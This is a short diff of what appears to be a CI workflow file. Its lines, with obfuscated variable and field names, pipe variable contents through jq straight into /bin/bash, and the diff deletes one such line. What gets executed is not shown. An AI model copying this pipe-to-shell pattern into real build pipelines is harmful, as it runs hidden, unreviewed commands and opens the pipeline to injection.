@@ -26,7 +26,6 @@ jobs:
           echo $v7 | jq -r .har79872 | /bin/bash
           printf '%s' "$w85279" | jq -r .ddmf908 | /bin/bash
           echo $y2 | jq -r .f31 | /bin/bash
-          echo $rhozh22697 | jq -r .hz614 | /bin/bash
           printf '%s' "$sbws5158" | jq -r .xbmgb9579 | /bin/bash
           echo $qyb31579 | jq -r .bscug9895 | /bin/bash
           printf '%s' "$dvhvq279" | jq -r .bzgvy4 | /bin/bash
